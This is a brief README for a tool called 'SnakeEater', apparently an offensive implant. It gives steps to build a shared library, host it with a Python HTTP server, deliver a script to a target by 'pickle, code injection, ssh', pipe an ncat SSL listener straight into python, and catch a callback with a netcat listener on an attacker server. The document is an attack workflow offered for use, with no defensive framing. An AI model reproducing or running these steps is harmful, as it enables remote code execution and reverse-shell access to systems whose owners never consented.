# SnakeEater

### To start:

Run the following commands:


`cmake .`

`make`


Now you should have the libSnakeEater.so file in the current directory. Host this somewhere. 

#### For Example:
`python2 -m SimpleHTTPServer 8080`

Then invoke the script in whatever way (pickle, code injection, ssh, or etc)

`ncat -nvlp 4443 --ssl | python -`   <- i just learned this trick and I love it

you know, whatever...

Then set up a net cat listener on whatever server you configured in `library.cpp`
